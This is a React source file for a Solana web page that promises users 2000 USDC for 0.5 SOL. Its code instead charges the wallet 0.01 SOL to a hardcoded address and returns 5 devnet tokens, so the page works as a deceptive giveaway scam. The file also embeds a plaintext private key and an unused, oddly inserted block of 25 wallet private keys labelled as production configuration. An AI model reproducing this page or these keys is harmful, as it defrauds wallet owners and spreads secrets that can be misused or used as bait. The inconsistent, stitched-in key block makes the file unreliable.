/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4oDTGCP6fRATgmvubmTxizaD5pRzqLUus6UxC1NYaD9arazUGDFdxym6xYMnU771BpZeCAmmXcHquecy8uoKaUJG"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "2mWdCwHtM2vYPNuaEriGfTCHMqQfbpGRtrdyfVWWS7ZaT38edz9f5JDHBxNW1pR3t91QkLGM717nJ5hoF8F8ETJa",
  "key1": "3KEkUGTezSWgHCrgpSqGK8UzxE1vQ2rTveAxsbKWdjqk3XisQsa25ZuYPmP89jnq3MRCpWjs5HDr8xyvp5aRHeEY",
  "key2": "66976zfqDB1y76XL1ADJhyWkex27wdED6qMDbGqsFLmZYNdHrz2ewPa1SoLGw3UAhccETyMvskckyCPUN5Ujnn13",
  "key3": "28yJLeystL8n9wU2wdufqRAcnRpFT69TbWtUWKuXJfqhQPeksVkKNWd9wEy6JZo5teoYEaxAi9qy3NEDrtgPmFbU",
  "key4": "BcjSyZY6cgu9kycZu6x2bYB4VaLkkn65GieeQfjZPsjbE3mRHSebew3NHen3a6ZaVXFSsD83DALBg4d8AKjGTG3",
  "key5": "HkMDgeUoJXRDWEYBEPo3Zo165s3ctvk34tGZqKdF1xFiJPBVzQCZZmDvraEP8yVcaGmgfPJbinwvDXhEZynXwhK",
  "key6": "JFW8kb39nkxNhiGSodUMHJa8ghpuq9p41GSmVZVvZdf9xR75mA1b41Vb8YUucs5wEEGTgoAuo5kveijCsxzoP4b",
  "key7": "pm6aYpJvucmucvRd9S2az4xtcVsCmeeWJmQsNoET5eAu6QWPQLosRRF1HZJ1TEQhGa38g4i4ZrpMJ9AE6PYQhTq",
  "key8": "vY6xkYd7B1bSfTUZm8iLbALtsicSfMLnxkhHCBya8mmFxBKWQgzkGcxncQkiHttrboAoW3GKNZJVzDLFFauVPBM",
  "key9": "5UkfDitRNp6pVtLNrgiyE3NDpAXkxdA6y96Hd3AtYfUGBVbZED7W8ofPHCQNHiAM16zbJTd4P63gAwTwHUYjURtY",
  "key10": "27RzHzJiK769rdPGQFFe9k8c3TaE8uUYRBE1MBX3tDiRsTn9QRiZ6BVM8enS4aosUPzVzCWahLT7FL5gFsLkcmm6",
  "key11": "2ZhrntGuN1bCvoaMvUYKit8wu6w6gQXBqbZECpXb1DkB4Ye2BvnDC1n1RcrxiZ28FLa7SvZHXzvBRMNyToNJvrer",
  "key12": "2DSx65c7sU7KkWUdeU7gr8AiS2YF9PeCDF4ZKoE1smYBD8fcVXsLogcPbA8V8v858k7zs6qirX6JoyThp7hGg935",
  "key13": "3ahPMZ65tSFYLeFBkWPtjgCaGBADmC5mvan4frcVPAnAaYPsMaoNzuwATED6ydYjSvdvYPmbLtrTqAyqqhrTbUTQ",
  "key14": "65ApvbkgJrBG6C9bJqb1KJAD3zdjgRurtPF7aKu2Ma6MetAjokpuAsqZfRmsxHZrFM3zf2vQPrQhvusqzpjztEmE",
  "key15": "3obS8cwBCHUUdSYoGZnq6UzVf4rmGu7C8bkAAiRmdCsCdXNCHZwdx9HQsivPukuRAEd1AMwNr2e8EU14rktd1MGn",
  "key16": "2u9mApSaJwn4UFpUPVXrHRVc9YRP8UDgJQDQSnknn5YS1oVFbRi9YRzabT75vFFTq2eYFiSyqWrfwCQ4GCFp8Wuv",
  "key17": "4y2k4c6oS5dFKyFj9RK6EpAyjRosf1fVBiLMukCcPMJaktzdgMA1nCkWGwBFziGyC141Na74yVZDfWv6tmj8bKuc",
  "key18": "4qMB7o3upxAwUSYYjQeeHaJgQeAf26AA4PPaieyhnJPoqYym7AG3iscDs9AHpPdphWZmcJ3BK7DU1JqvSj1Rr3Uf",
  "key19": "ECB8LyLDrpSoH9m3qz3EREd4zUn5xENz9buTJvopLZhiyKiznFbNFAeuhFQ8Xh9Ny33tAyL5EpDhQ6wP4HCPUKJ",
  "key20": "6YGYvuexFpMy9BeG3dqTzN6Ki4HRiiowQTfjMzj4WWoJVsveXGU7upJthNfwG4HMYFaCKu8SFEQUJw3GYE7x56Y",
  "key21": "3AdrGMMYhqVbdsheoofyFKaw9J52C2ukSsbY3YQXpKEzXAxKHSJVC6fVkfPYbHdLqtdAhFyNRikkCvKyLarc2g4P",
  "key22": "Z9iGuzrvw51R14DZhFu1ZN4p4BH4rnpheS4uuYfWtxJ6HYr4mDYJaPqmdFCAvD9FTcS49ruEQik1ZYCxMAG1P4r",
  "key23": "7Vy1LkuMQh3hPNU9TCs5hpwE34BwTYvGDXmHHzabWZMvnXQjPJLYiCr2bQwLJ5eMRfMrutwzVte5GrcCHfDsfCT",
  "key24": "2D7E3qsVrgouVacsy7D73F4HQw588A1D8BHMiXeoh8RFbxbRFDStozATnaXUbD4bbJS8kkkBnpNuF2YuVn7qwoGr"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
